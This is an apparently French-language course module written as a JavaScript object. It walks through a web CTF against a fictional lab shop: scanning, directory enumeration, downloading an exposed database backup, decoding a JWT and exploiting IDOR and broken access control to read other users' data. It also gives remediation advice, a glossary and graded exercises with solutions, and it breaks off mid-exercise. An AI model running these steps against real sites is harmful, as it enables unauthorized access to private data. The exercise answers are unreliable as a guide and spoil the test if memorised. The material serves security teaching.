export default {
  id: 'm9',
  num: 9,
  title: "CTF 01 — Application Web de A à Z",
  short: "CTF Web",
  icon: "🚩",
  xp: 500,
  duration: 100,
  summary: "Résoudre un CTF web complet, étape par étape : reconnaissance, énumération, lecture de JavaScript, authentification, JWT, IDOR et contrôle d'accès défaillant jusqu'au flag final.",
  objectives: [
    "Dérouler une méthodologie web complète sur une cible de lab autorisée",
    "Passer de la découverte d'un service à la cartographie des routes et des API",
    "Exploiter un JWT et un contrôle d'accès défaillant pour capturer les flags",
    "Documenter chaque étape avec une preuve reproductible et proposer les correctifs"
  ],
  blocks: [
    {
      t: 'callout', v: 'legal', title: "Cible de laboratoire uniquement",
      x: "Ce parcours utilise une cible fictive <code>shop.ctf.lab</code> (10.10.10.20) spécialement conçue pour le CTF. Toutes les commandes sont à exécuter dans votre lab local ou une VM autorisée. Ne testez jamais un site réel sans autorisation écrite : un CTF pédagogique ne donne aucun droit sur Internet."
    },
    {
      t: 'p',
      x: "Un <strong>CTF</strong> (Capture The Flag) est un exercice offensif où l'objectif est de trouver des chaînes cachées appelées <strong>flags</strong>. Ici, chaque flag valide une étape de la compromission. Le vrai livrable n'est pas le flag : c'est le <strong>raisonnement reproductible</strong> qui permet de passer d'un service exposé à une preuve d'impact."
    },
    {
      t: 'mini',
      items: [
        { v: 'cyan', h: 'Cible', p: "<code>shop.ctf.lab</code> → <code>10.10.10.20</code>. Ports web 80 et 8080, SSH 22. Applicatif Node/Express derrière nginx." },
        { v: 'amber', h: 'Format des flags', p: "<code>FLAG{...}</code>. Chaque flag est unique et apparaît dans une réponse, un fichier ou une base. Notez-le avec la commande et l'horodatage." },
        { v: 'lime', h: 'Objectif final', p: "Atteindre l'endpoint interne réservé à l'administration et capturer <code>FLAG{WEB_APP_OWNED}</code>." },
        { v: 'magenta', h: 'Règles', p: "Pas de DoS, pas de données réelles, pas de destruction. Une seule requête suffit pour prouver un accès en lecture." }
      ]
    },
    { t: 'h', x: "9.1 Préparer le dossier de capture" },
    {
      t: 'p',
      x: "Un CTF réussi se rejoue. Créez un dossier par cible, un journal et un fichier de flags. Toutes les preuves doivent être horodatées et conservées avec la commande qui les a produites."
    },
    {
      t: 'code', lang: 'bash', title: "Espace de travail et journal",
      x: `mkdir -p ~/ctf/shop/{evidence,notes,flags}
cd ~/ctf/shop
echo "[$(date -Iseconds)] début CTF shop.ctf.lab" >> notes/journal.md
echo "10.10.10.20 shop.ctf.lab" | sudo tee -a /etc/hosts
getent hosts shop.ctf.lab`
    },
    {
      t: 'term',
      title: "Vérification de la cible",
      x: [
        { c: "getent hosts shop.ctf.lab", o: ["10.10.10.20    shop.ctf.lab"] },
        { c: "echo \"[$(date -Iseconds)] cible résolue\" >> notes/journal.md", o: [] }
      ]
    },
    { t: 'h', x: "9.2 Étape 1 — Reconnaissance réseau" },
    {
      t: 'p',
      x: "On commence par identifier les services réellement exposés. Un scan de versions évite de supposer que le site est la seule porte d'entrée. On enregistre la sortie : elle servira de preuve et de référence pour la suite."
    },
    {
      t: 'code', lang: 'bash', title: "Scan des ports et des versions",
      x: `nmap -sV -sC -p- 10.10.10.20 -oN evidence/nmap.txt
sed -n '1,40p' evidence/nmap.txt`
    },
    {
      t: 'term',
      title: "Sortie Nmap simulée",
      x: [
        { c: "nmap -sV -sC -p- 10.10.10.20 -oN evidence/nmap.txt", o: [
          "PORT     STATE SERVICE VERSION",
          "22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu",
          "80/tcp   open  http    nginx 1.18.0",
          "8080/tcp open  http    Node.js Express framework",
          "| http-title: ShopLab — Boutique de démonstration",
          "|_http-server-header: nginx/1.18.0",
          "Service Info: OS: Linux"
        ] },
        { c: "grep -E '^[0-9]+/tcp' evidence/nmap.txt", o: ["22/tcp open ssh", "80/tcp open http", "8080/tcp open http"] }
      ]
    },
    {
      t: 'callout', v: 'tip', title: "Premier flag — dans les en-têtes",
      x: "Le serveur de lab ajoute un en-tête pédagogique sur la page d'accueil. Lisez toujours les en-têtes avant de fuzzer : ils révèlent la stack, les cookies et parfois un indice."
    },
    {
      t: 'code', lang: 'bash', title: "Lire les en-têtes et capturer le flag 1",
      x: `curl -sI http://shop.ctf.lab/ | tee evidence/headers.txt
grep -i '^x-lab-flag' evidence/headers.txt`
    },
    {
      t: 'term',
      title: "Flag 1",
      x: [
        { c: "curl -sI http://shop.ctf.lab/ | grep -iE '^(server|x-powered-by|x-lab-flag)'", o: [
          "Server: nginx/1.18.0",
          "X-Powered-By: Express",
          "X-Lab-Flag: FLAG{WEB_RECON_HEADERS}"
        ] }
      ]
    },
    { t: 'h', x: "9.3 Étape 2 — Empreinte et découverte de contenu" },
    {
      t: 'p',
      x: "WhatWeb confirme la technologie. Ensuite, on cherche les chemins non référencés : interfaces d'administration, sauvegardes, fichiers de configuration, routes d'API. Une wordlist courte suffit sur un lab ; l'important est de filtrer le bruit."
    },
    {
      t: 'code', lang: 'bash', title: "Empreinte et énumération de répertoires",
      x: `whatweb -a 3 http://shop.ctf.lab | tee evidence/whatweb.txt
gobuster dir -u http://shop.ctf.lab -w /usr/share/wordlists/dirb/common.txt \\
  -x php,js,json,txt,bak -t 20 -o evidence/gobuster.txt
grep -E 'Status: 200|Status: 301|Status: 403' evidence/gobuster.txt`
    },
    {
      t: 'term',
      title: "Résultats d'énumération",
      x: [
        { c: "whatweb -a 3 http://shop.ctf.lab", o: [
          "http://shop.ctf.lab [200 OK] Cookies[connect.sid], Country[RESERVED][ZZ], Express, HTML5, nginx[1.18.0], jQuery[3.6.0]"
        ] },
        { c: "gobuster dir -u http://shop.ctf.lab -w common.txt -x php,js,json,txt,bak", o: [
          "/admin                (Status: 403)",
          "/api                  (Status: 200)",
          "/backup               (Status: 301)",
          "/robots.txt           (Status: 200)",
          "/static               (Status: 301)"
        ] }
      ]
    },
    {
      t: 'p',
      x: "On lit <code>robots.txt</code> : il interdit parfois des chemins qui révèlent l'architecture. Une sauvegarde exposée peut contenir des identifiants, mais elle doit être confirmée sans télécharger de données réelles."
    },
    {
      t: 'code', lang: 'bash', title: "Robots et sauvegarde",
      x: `curl -s http://shop.ctf.lab/robots.txt | tee evidence/robots.txt
curl -s -o evidence/backup-listing.html -w "%{http_code}\\n" http://shop.ctf.lab/backup/
curl -s http://shop.ctf.lab/backup/db.sql.gz -o evidence/db.sql.gz
file evidence/db.sql.gz
zgrep -iE 'flag|password|admin' evidence/db.sql.gz | head -20`
    },
    {
      t: 'term',
      title: "Indices dans la sauvegarde",
      x: [
        { c: "curl -s http://shop.ctf.lab/robots.txt", o: ["User-agent: *", "Disallow: /backup/", "Disallow: /api/v1/internal/"] },
        { c: "zgrep -iE 'flag|password|admin' evidence/db.sql.gz | head", o: [
          "-- FLAG{WEB_BACKUP_LEAK}",
          "INSERT INTO users VALUES (1,'admin','$2b$12$...', 'admin');",
          "INSERT INTO users VALUES (2,'alice','$2b$12$...', 'user');"
        ] }
      ]
    },
    {
      t: 'callout', v: 'warn', title: "Flag 2 et credentials de lab",
      x: "La sauvegarde expose un flag et des comptes. Sur un lab, les mots de passe associés sont fournis dans le brief. Ici, le compte de test est <code>alice:alice123</code>. Ne réutilisez jamais un mot de passe trouvé sur un système réel : cela sortirait du périmètre et pourrait exposer des données personnelles."
    },
    { t: 'h', x: "9.4 Étape 3 — Cartographier l'API depuis le JavaScript" },
    {
      t: 'p',
      x: "Les routes de l'API ne sont pas toujours visibles dans le menu. Les bundles JavaScript contiennent souvent les chemins, les méthodes et les paramètres. On extrait les chaînes <code>/api/...</code>, puis on trie pour éliminer les doublons."
    },
    {
      t: 'code', lang: 'bash', title: "Extraire les endpoints du bundle",
      x: `curl -s http://shop.ctf.lab/static/js/app.js -o evidence/app.js
grep -oE '"/api/[a-zA-Z0-9/_{}.-]+"' evidence/app.js | sort -u | tee evidence/endpoints.txt
grep -nE 'login|orders|users|internal|admin' evidence/app.js | head -30`
    },
    {
      t: 'term',
      title: "Endpoints découverts",
      x: [
        { c: "grep -oE '\"/api/[a-zA-Z0-9/_{}.-]+\"' evidence/app.js | sort -u", o: [
          "\"/api/v1/internal/flag\"",
          "\"/api/v1/login\"",
          "\"/api/v1/orders/{id}\"",
          "\"/api/v1/users/{id}\""
        ] }
      ]
    },
    {
      t: 'p',
      x: "La route <code>/api/v1/internal/flag</code> est manifestement l'objectif final. On ne l'appelle pas encore : sans jeton valide, elle renverra 401. On commence par obtenir une session légitime avec le compte de test."
    },
    { t: 'h', x: "9.5 Étape 4 — Authentification et lecture du JWT" },
    {
      t: 'p',
      x: "L'API renvoie un JWT. Un JWT se compose de trois parties encodées en Base64URL : en-tête, charge utile et signature. On peut lire la charge utile pour comprendre les rôles et les identifiants, mais on ne peut pas la modifier sans casser la signature — sauf si le serveur est mal configuré."
    },
    {
      t: 'code', lang: 'bash', title: "Connexion et décodage",
      x: `curl -s -X POST http://shop.ctf.lab/api/v1/login \\
  -H 'Content-Type: application/json' \\
  -d '{"username":"alice","password":"alice123"}' | tee evidence/login.json

TOKEN=$(jq -r '.token' evidence/login.json)
echo "$TOKEN" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | jq .`
    },
    {
      t: 'term',
      title: "Jeton et charge utile",
      x: [
        { c: "jq -r '.token' evidence/login.json", o: ["eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIyIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3OTI4NDgwMDB9.abc123"] },
        { c: "echo \"$TOKEN\" | cut -d. -f2 | base64 -d | jq .", o: [
          '{ "sub": "2", "role": "user", "iat": 1792848000 }'
        ] }
      ]
    },
    {
      t: 'p',
      x: "Le jeton indique <code>sub=2</code> et <code>role=user</code>. Le serveur doit vérifier la signature et le rôle à chaque requête. On teste d'abord l'accès à ses propres données, puis à celles d'un autre utilisateur."
    },
    { t: 'h', x: "9.6 Étape 5 — IDOR sur les commandes" },
    {
      t: 'p',
      x: "Une API qui accepte un identifiant d'objet sans vérifier le propriétaire est vulnérable à un <strong>IDOR</strong>. On compare l'objet <code>1042</code> (Alice) et <code>1043</code> (un autre client). Si les deux réponses sont accessibles avec le même jeton, le contrôle d'accès est absent."
    },
    {
      t: 'code', lang: 'bash', title: "Comparer deux objets",
      x: `curl -s -H "Authorization: Bearer $TOKEN" \\
  http://shop.ctf.lab/api/v1/orders/1042 | tee evidence/order-1042.json

curl -s -H "Authorization: Bearer $TOKEN" \\
  http://shop.ctf.lab/api/v1/orders/1043 | tee evidence/order-1043.json

jq -r '.note' evidence/order-1043.json`
    },
    {
      t: 'term',
      title: "Flag 3 — IDOR",
      x: [
        { c: "curl -s -H \"Authorization: Bearer $TOKEN\" .../orders/1043 | jq -r '.note'", o: [
          "Commande de démonstration — FLAG{WEB_IDOR_ORDERS}"
        ] }
      ]
    },
    {
      t: 'callout', v: 'danger', title: "Pourquoi c'est grave",
      x: "L'IDOR ne nécessite aucune injection : il suffit de changer un identifiant. Sur une vraie boutique, cela expose les commandes, adresses, factures et parfois les données de carte. La correction est un contrôle d'accès serveur sur chaque objet, pas un identifiant plus long."
    },
    { t: 'h', x: "9.7 Étape 6 — Contrôle d'accès horizontal puis vertical" },
    {
      t: 'p',
      x: "On teste ensuite <code>/api/v1/users/1</code> avec le jeton d'Alice. Si l'admin est retourné, on a un IDOR horizontal (lecture d'un autre compte). Enfin, on appelle la route interne : si elle ne vérifie que la présence d'un jeton et pas le rôle, on obtient le flag final."
    },
    {
      t: 'code', lang: 'bash', title: "Lire un autre utilisateur puis le flag final",
      x: `curl -s -H "Authorization: Bearer $TOKEN" \\
  http://shop.ctf.lab/api/v1/users/1 | tee evidence/user-1.json

curl -s -H "Authorization: Bearer $TOKEN" \\
  http://shop.ctf.lab/api/v1/internal/flag | tee evidence/final-flag.json

jq -r '.flag' evidence/final-flag.json`
    },
    {
      t: 'term',
      title: "Flag final",
      x: [
        { c: "curl -s -H \"Authorization: Bearer $TOKEN\" .../api/v1/users/1", o: [
          '{"id":1,"username":"admin","email":"admin@shop.ctf.lab","role":"admin","flag":"FLAG{WEB_IDOR_USERS}"}'
        ] },
        { c: "curl -s -H \"Authorization: Bearer $TOKEN\" .../api/v1/internal/flag", o: [
          '{"flag":"FLAG{WEB_APP_OWNED}","scope":"admin"}'
        ] }
      ]
    },
    { t: 'h', x: "9.8 Récapitulatif de la capture" },
    {
      t: 'table',
      head: ['Étape', 'Action', 'Flag'],
      rows: [
        ['1', "Lire les en-têtes HTTP", 'FLAG{WEB_RECON_HEADERS}'],
        ['2', "Analyser robots.txt et la sauvegarde exposée", 'FLAG{WEB_BACKUP_LEAK}'],
        ['3', "Extraire les endpoints du JavaScript", "Aucun flag — cartographie"],
        ['4', "Se connecter et décoder le JWT", "Aucun flag — compréhension"],
        ['5', "Changer l'identifiant de commande", 'FLAG{WEB_IDOR_ORDERS}'],
        ['6', "Lire l'utilisateur admin", 'FLAG{WEB_IDOR_USERS}'],
        ['7', "Appeler la route interne avec le jeton utilisateur", 'FLAG{WEB_APP_OWNED}']
      ]
    },
    {
      t: 'callout', v: 'tip', title: "Le réflexe à garder",
      x: "Un CTF web se déroule toujours dans le même ordre : <strong>surface → technologies → chemins → données exposées → authentification → autorisation</strong>. La faille finale est souvent une combinaison de petites erreurs, pas un exploit magique."
    },
    { t: 'h', x: "9.9 Remédiation" },
    {
      t: 'ul',
      x: [
        "Retirer les en-têtes de debug et les flags pédagogiques de la production.",
        "Bloquer l'accès à <code>/backup/</code>, <code>/.git/</code> et à tout fichier de sauvegarde ; déplacer les exports hors du webroot.",
        "Ajouter un contrôle d'accès serveur sur chaque objet : l'utilisateur doit être propriétaire de la ressource ou disposer du rôle requis.",
        "Vérifier le rôle dans le jeton côté serveur, pas seulement la présence d'une signature valide. Une route admin exige un rôle admin.",
        "Faire expirer les JWT, prévoir une révocation et ne jamais stocker de secret dans le JavaScript.",
        "Journaliser les accès 403/401 et alerter sur les changements d'identifiant répétés."
      ]
    },
    { t: 'h', x: "9.10 Fiches commandes du parcours" },
    {
      t: 'cmdref',
      items: [
        {
          cmd: 'nmap -sV -sC', tag: 'Reconnaissance',
          what: "Détecte les ports ouverts, les services et leurs versions, et exécute les scripts NSE par défaut.",
          gives: "La liste des services exposés, les bannières et parfois des informations de configuration ou de titre HTTP.",
          use: "Lancer un scan complet sur la cible de lab, puis filtrer les ports ouverts pour construire la carte d'attaque.",
          syntax: 'nmap -sV -sC -p- IP -oN evidence/nmap.txt',
          example: 'nmap -sV -sC -p- 10.10.10.20 -oN evidence/nmap.txt',
          read: "Chaque port ouvert est une porte d'entrée potentielle. Un service web sur un port alternatif (8080) peut exposer une API différente de celle du port 80. Conservez la sortie : elle prouve l'exposition."
        },
        {
          cmd: 'whatweb -a 3', tag: 'Empreinte',
          what: "Identifie les technologies d'une application web à partir des en-têtes, cookies, fichiers et comportements.",
          gives: "Serveur, framework, CMS, bibliothèques JavaScript, cookies et parfois la version.",
          use: "Confirmer la stack avant de chercher des routes et des vulnérabilités adaptées.",
          syntax: 'whatweb -a 3 http://hote',
          example: 'whatweb -a 3 http://shop.ctf.lab',
          read: "Une version ancienne est une piste, pas une preuve. Croisez avec les en-têtes et les fichiers statiques. Un cookie <code>connect.sid</code> indique souvent Express/Node."
        },
        {
          cmd: 'gobuster dir', tag: 'Énumération',
          what: "Teste des noms de fichiers et de répertoires issus d'une wordlist et affiche les codes HTTP.",
          gives: "Les chemins existants, leur code (200, 301, 403) et parfois leur taille.",
          use: "Découvrir les interfaces d'administration, les sauvegardes et les routes non liées depuis le menu.",
          syntax: 'gobuster dir -u URL -w wordlist -x extensions -t 20 -o sortie.txt',
          example: 'gobuster dir -u http://shop.ctf.lab -w /usr/share/wordlists/dirb/common.txt -x php,js,json,txt,bak -t 20',
          read: "Un 403 indique que la ressource existe mais est protégée. Un 301 peut révéler un répertoire listable. Filtrez les soft 404 en comparant avec une URL inexistante."
        },
        {
          cmd: 'curl', tag: 'Exploration HTTP',
          what: "Envoie des requêtes HTTP et affiche les en-têtes, le corps ou les codes de réponse.",
          gives: "Les en-têtes, les cookies, les redirections, les réponses JSON et les codes d'erreur.",
          use: "Lire <code>robots.txt</code>, récupérer une sauvegarde, se connecter à l'API et rejouer une requête avec un jeton.",
          syntax: 'curl -s [-I] [-X METHODE] [-H "Header: valeur"] [-d corps] URL',
          example: 'curl -s -H "Authorization: Bearer $TOKEN" http://shop.ctf.lab/api/v1/internal/flag',
          read: "Un 401 signifie « authentification absente ou invalide » ; un 403 signifie « authentifié mais interdit ». Un 200 sur une route interne avec un jeton utilisateur est un défaut d'autorisation."
        },
        {
          cmd: 'jq', tag: 'Lecture JSON',
          what: "Extrait et formate des champs d'une réponse JSON.",
          gives: "Le token, le rôle, l'identifiant ou le flag sous forme lisible.",
          use: "Éviter de lire à l'œil une réponse compacte et automatiser l'extraction des preuves.",
          syntax: 'jq -r \'.champ\' fichier.json',
          example: 'TOKEN=$(jq -r \'.token\' evidence/login.json)',
          read: "Vérifiez le type de chaque champ : un rôle peut être un tableau, un identifiant peut être une chaîne. Une extraction qui renvoie <code>null</code> signale un mauvais chemin JSON."
        },
        {
          cmd: 'base64 -d', tag: 'JWT',
          what: "Décode une chaîne Base64 ou Base64URL, notamment la charge utile d'un JWT.",
          gives: "Le JSON interne du jeton : sujet, rôle, date d'émission, expiration.",
          use: "Comprendre les privilèges revendiqués par le jeton avant de tester les autorisations.",
          syntax: 'echo "$TOKEN" | cut -d. -f2 | tr \'_- \' \'/+\' | base64 -d',
          example: 'echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq .',
          read: "Le contenu d'un JWT est lisible par tous : ne mettez jamais de secret dedans. La sécurité repose sur la signature et sur la vérification serveur, pas sur l'opacité."
        }
      ]
    },
    { t: 'h', x: "9.11 Glossaire du CTF web" },
    {
      t: 'glossary',
      items: [
        { term: 'CTF', full: 'Capture The Flag', def: "Exercice de sécurité où l'on doit trouver des flags cachés dans un environnement autorisé.", use: "S'entraîner aux enchaînements réels sans cible illégale. Le raisonnement compte plus que le flag.", ex: 'FLAG{WEB_APP_OWNED}' },
        { term: 'Flag', def: "Chaîne unique qui prouve la réussite d'une étape.", use: "La noter avec la commande, l'horodatage et le chemin de la preuve.", ex: 'FLAG{WEB_IDOR_ORDERS}' },
        { term: 'Foothold', def: "Premier accès obtenu sur une cible, souvent avec des privilèges faibles.", use: "À partir de là, énumérer pour élever les privilèges ou atteindre les données sensibles.", ex: 'un jeton utilisateur valide' },
        { term: 'Énumération', def: "Découverte systématique des ressources, utilisateurs, routes et versions disponibles.", use: "Construire une carte avant d'exploiter. Sans énumération, on devine au lieu de comprendre.", ex: 'gobuster, wpscan, ffuf' },
        { term: 'Wordlist', def: "Liste de noms ou de mots utilisée pour tester des chemins ou des mots de passe.", use: "Commencer petit et ciblé ; une wordlist massive sur un lab est lente et bruyante.", ex: 'common.txt, rockyou.txt' },
        { term: 'Soft 404', def: "Page qui renvoie 200 alors que la ressource n'existe pas.", use: "Calibrer une URL inexistante et filtrer par taille ou contenu pour éviter les faux positifs.", ex: 'filtrer -fs 1234 dans ffuf' },
        { term: 'JWT', full: 'JSON Web Token', def: "Jeton signé contenant des revendications (sujet, rôle, expiration) sous forme de JSON encodé.", use: "Lire la charge utile pour comprendre les droits, mais toujours vérifier la signature côté serveur.", ex: 'header.payload.signature' },
        { term: 'IDOR', full: 'Insecure Direct Object Reference', def: "Accès à un objet d'autrui en modifiant son identifiant, sans contrôle d'autorisation.", use: "Tester les identifiants adjacents avec le même jeton et documenter la réponse.", ex: '/orders/1043 au lieu de /orders/1042' },
        { term: 'Contrôle d\'accès horizontal', def: "Vérification qu'un utilisateur ne peut pas accéder aux ressources d'un autre utilisateur de même rôle.", use: "Contrôler la propriété de chaque objet côté serveur, pas seulement l'authentification.", ex: 'Alice ne doit pas lire la commande de Bob.' },
        { term: 'Contrôle d\'accès vertical', def: "Vérification qu'un utilisateur ne peut pas exécuter une action réservée à un rôle supérieur.", use: "Contrôler le rôle sur chaque route sensible (admin, interne, export).", ex: 'un utilisateur ne doit pas appeler /internal/flag' },
        { term: 'Preuve reproductible', def: "Requête, réponse et contexte permettant à un tiers de constater la vulnérabilité.", use: "Joindre la commande exacte, le code HTTP et la donnée minimale nécessaire.", ex: 'curl + response + horodatage' },
        { term: 'Remédiation', def: "Correction qui supprime la cause de la vulnérabilité, pas seulement le symptôme.", use: "Contrôle d'accès serveur, suppression des sauvegardes, en-têtes de debug retirés.", ex: 'vérifier req.user.id === order.userId' }
      ]
    }
  ],
  exos: [
    {
      id: 'm9-e1',
      title: 'Scanner la cible',
      context: "Vous démarrez le CTF <code>shop.ctf.lab</code> (10.10.10.20) et devez identifier les services exposés.",
      task: "Lancez un scan Nmap complet avec détection de versions et scripts par défaut, et enregistrez-le dans <code>evidence/nmap.txt</code>.",
      hint: "Combinez <code>-sV -sC -p-</code> et <code>-oN evidence/nmap.txt</code>.",
      accept: [/nmap\s+-sV\s+-sC\s+-p-\s+10\.10\.10\.20\s+-oN\s+evidence\/nmap\.txt/i],
      solution: 'nmap -sV -sC -p- 10.10.10.20 -oN evidence/nmap.txt',
      output: [
        '22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu',
        '80/tcp   open  http    nginx 1.18.0',
        '8080/tcp open  http    Node.js Express framework',
        '++3 services exposés'
      ],
      read: "Le port 80 sert le site principal, le 8080 une API Node/Express. SSH est aussi accessible : une piste pour la post-exploitation si des identifiants fuient.",
      pivot: "Notez les versions et les ports dans le journal. Testez les deux ports web séparément : ils peuvent avoir des routes et des en-têtes différents."
    },
    {
      id: 'm9-e2',
      title: 'Lire le premier flag dans les en-têtes',
      context: "La page d'accueil contient peut-être des informations dans ses en-têtes de réponse.",
      task: "Affichez les en-têtes de <code>http://shop.ctf.lab/</code> et filtrez la ligne <code>x-lab-flag</code>.",
      hint: "Utilisez <code>curl -sI</code> puis <code>grep -i</code>.",
      accept: [/curl\s+-sI\s+http:\/\/shop\.ctf\.lab\/?\s*\|\s*grep\s+-i\s+["']?x-lab-flag/i],
      solution: 'curl -sI http://shop.ctf.lab/ | grep -i "x-lab-flag"',
      output: ['x-lab-flag: FLAG{WEB_RECON_HEADERS}'],
      read: "Le flag est exposé dans un en-tête personnalisé. Le serveur divulgue aussi <code>nginx/1.18.0</code> et <code>Express</code>.",
      pivot: "Consignez le flag avec la commande. En audit réel, un en-tête de debug ou un en-tête custom est un signe de configuration non maîtrisée."
    },
    {
      id: 'm9-e3',
      title: 'Identifier la stack',
      context: "Vous devez confirmer le framework et le serveur web avant de chercher des routes.",
      task: "Lancez WhatWeb en mode agressif sur <code>http://shop.ctf.lab</code>.",
      hint: "Utilisez <code>whatweb -a 3</code>.",
      accept: [/whatweb\s+-a\s*3\s+http:\/\/shop\.ctf\.lab\/?/i],
      solution: 'whatweb -a 3 http://shop.ctf.lab',
      output: [
        'http://shop.ctf.lab [200 OK] Cookies[connect.sid], Express, HTML5, nginx[1.18.0], jQuery[3.6.0]',
        '++Stack confirmée : nginx + Express + jQuery'
      ],
      read: "Le cookie <code>connect.sid</code> confirme une session Express. jQuery 3.6.0 est récent ; la piste principale reste l'API et les routes non documentées.",
      pivot: "Cherchez ensuite les fichiers JavaScript et les routes API. Une stack connue permet de choisir les bons tests sans scanner au hasard."
    },
    {
      id: 'm9-e4',
      title: 'Découvrir les chemins cachés',
      context: "Le menu ne montre ni l'administration ni les sauvegardes.",
      task: "Énumérez les répertoires avec Gobuster sur <code>http://shop.ctf.lab</code> avec la wordlist <code>common.txt</code> et les extensions <code>php,js,json,txt,bak</code>.",
      hint: "Utilisez <code>gobuster dir -u URL -w wordlist -x extensions</code>.",
      accept: [/gobuster\s+dir\s+-u\s+http:\/\/shop\.ctf\.lab\/?\s+-w\s+\S*common\.txt\s+-x\s+php,js,json,txt,bak/i],
      solution: 'gobuster dir -u http://shop.ctf.lab -w /usr/share/wordlists/dirb/common.txt -x php,js,json,txt,bak -t 20',
      output: [
        '/admin                (Status: 403)',
        '/api                  (Status: 200)',
        '/backup               (Status: 301)',
        '/robots.txt           (Status: 200)',
        '/static               (Status: 301)'
      ],
      read: "Le 403 sur <code>/admin</code> signifie que la ressource existe mais est protégée. <code>/backup</code> et <code>robots.txt</code> sont les prochaines cibles.",
      pivot: "Lisez robots.txt, testez /backup/ et comparez la taille des réponses pour éliminer les soft 404."
    },
    {
      id: 'm9-e5',
      title: 'Lire robots.txt',
      context: "Les robots d'indexation reçoivent parfois une liste de chemins à ne pas visiter… qui révèle l'architecture.",
      task: "Affichez <code>http://shop.ctf.lab/robots.txt</code>.",
      hint: "Une simple requête <code>curl -s</code> suffit.",
      accept: [/curl\s+-s\s+http:\/\/shop\.ctf\.lab\/robots\.txt/i],
      solution: 'curl -s http://shop.ctf.lab/robots.txt',
      output: [
        'User-agent: *',
        'Disallow: /backup/',
        'Disallow: /api/v1/internal/'
      ],
      read: "Deux chemins sensibles sont révélés : la sauvegarde et l'API interne. Le fichier robots.txt ne protège rien, il indique seulement aux robots de ne pas indexer.",
      pivot: "Testez <code>/backup/</code> pour un listing ou une archive, et gardez <code>/api/v1/internal/</code> pour la phase d'autorisation."
    },
    {
      id: 'm9-e6',
      title: 'Analyser la sauvegarde exposée',
      context: "Le dossier <code>/backup/</code> contient une archive SQL de la base de démonstration.",
      task: "Téléchargez <code>http://shop.ctf.lab/backup/db.sql.gz</code> dans <code>evidence/db.sql.gz</code>, puis recherchez les lignes contenant <code>flag</code> ou <code>password</code>.",
      hint: "Téléchargez avec <code>curl -s -o</code> puis utilisez <code>zgrep -iE</code>.",
      accept: [/curl\s+-s\s+http:\/\/shop\.ctf\.lab\/backup\/db\.sql\.gz\s+-o\s+evidence\/db\.sql\.gz.*zgrep\s+-iE\s+["'].*flag.*password/i],
      solution: 'curl -s http://shop.ctf.lab/backup/db.sql.gz -o evidence/db.sql.gz && zgrep -iE "flag|password" evidence/db.sql.gz | head -20',
      output: [
        '-- FLAG{WEB_BACKUP_LEAK}',
        "INSERT INTO users VALUES (1,'admin','$2b$12$...','admin');",
        "INSERT INTO users VALUES (2,'alice','$2b$12$...','user');"
      ],
      read: "La sauvegarde expose un flag et des comptes. Le hash de mot de passe n'est pas directement lisible : le brief fournit le compte de test <code>alice:alice123</code>.",
      pivot: "Ne téléchargez que le nécessaire et ne diffusez jamais une sauvegarde réelle. En audit, l'accès à une sauvegarde est déjà un constat critique."
    },
    {
      id: 'm9-e7',
      title: 'Extraire les endpoints du JavaScript',
      context: "Le bundle <code>/static/js/app.js</code> contient les routes de l'API utilisées par l'interface.",
      task: "Téléchargez le bundle, puis extrayez les chaînes commençant par <code>/api/</code> et triez-les sans doublons.",
      hint: "Utilisez <code>grep -oE '\"/api/...\"'</code> puis <code>sort -u</code>.",
      accept: [/curl\s+-s\s+http:\/\/shop\.ctf\.lab\/static\/js\/app\.js\s+-o\s+evidence\/app\.js.*grep\s+-oE\s+["'].*\/api\/.*sort\s+-u/i],
      solution: 'curl -s http://shop.ctf.lab/static/js/app.js -o evidence/app.js && grep -oE \'"/api/[a-zA-Z0-9/_{}.-]+"\' evidence/app.js | sort -u',
      output: [
        '"/api/v1/internal/flag"',
        '"/api/v1/login"',
        '"/api/v1/orders/{id}"',
        '"/api/v1/users/{id}"'
      ],
      read: "Quatre routes sont exposées, dont une route interne. Les routes avec <code>{id}</code> sont des candidates IDOR.",
      pivot: "Testez d'abord <code>/login</code> avec le compte de lab, puis les routes avec un identifiant. Ne testez pas <code>/internal/flag</code> sans jeton : vous perdriez du temps."
    },
    {
      id: 'm9-e8',
      title: 'Se connecter à l\'API',
      context: "Le compte de test du lab est <code>alice:alice123</code>.",
      task: "Envoyez une requête POST JSON à <code>/api/v1/login</code> et enregistrez la réponse dans <code>evidence/login.json</code>.",
      hint: "Utilisez <code>curl -s -X POST -H 'Content-Type: application/json' -d '{\"username\":\"alice\",\"password\":\"alice123\"}'</code>.",
      accept: [/curl\s+-s\s+-X\s+POST\s+http:\/\/shop\.ctf\.lab\/api\/v1\/login\s+-H\s+["']Content-Type:\s*application\/json["']\s+-d\s+["']\{.*alice.*alice123.*\}["']/i],
      solution: 'curl -s -X POST http://shop.ctf.lab/api/v1/login -H "Content-Type: application/json" -d \'{"username":"alice","password":"alice123"}\'',
      output: [
        '{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...","expiresIn":3600}',
        '++Jeton utilisateur obtenu'
      ],
      read: "La réponse contient un JWT valable une heure. Le jeton doit être envoyé dans l'en-tête <code>Authorization: Bearer</code>.",
      pivot: "Décodez la charge utile pour connaître le rôle et l'identifiant, puis testez les routes avec ce jeton."
    },
    {
      id: 'm9-e9',
      title: 'Décoder la charge utile du JWT',
      context: "Vous devez vérifier le rôle et l'identifiant contenus dans le jeton d'Alice.",
      task: "Extrayez la deuxième partie du JWT, décodez-la en Base64 et affichez le JSON obtenu.",
      hint: "Utilisez <code>cut -d. -f2</code>, <code>base64 -d</code> et <code>jq .</code>.",
      accept: [/cut\s+-d\.\s+-f2.*base64\s+-d.*jq/i],
      solution: 'echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq .',
      output: [
        '{',
        '  "sub": "2",',
        '  "role": "user",',
        '  "iat": 1792848000',
        '}'
      ],
      read: "Alice est l'utilisateur 2 avec le rôle <code>user</code>. Le jeton n'est pas chiffré : seul le secret de signature empêche la falsification.",
      pivot: "Testez l'accès à <code>/users/1</code> et à <code>/orders/1043</code> avec ce jeton. Si le serveur répond, l'autorisation est défaillante."
    },
    {
      id: 'm9-e10',
      title: 'Exploiter l\'IDOR sur une commande',
      context: "Alice a la commande 1042. Vous voulez vérifier si elle peut lire la commande 1043.",
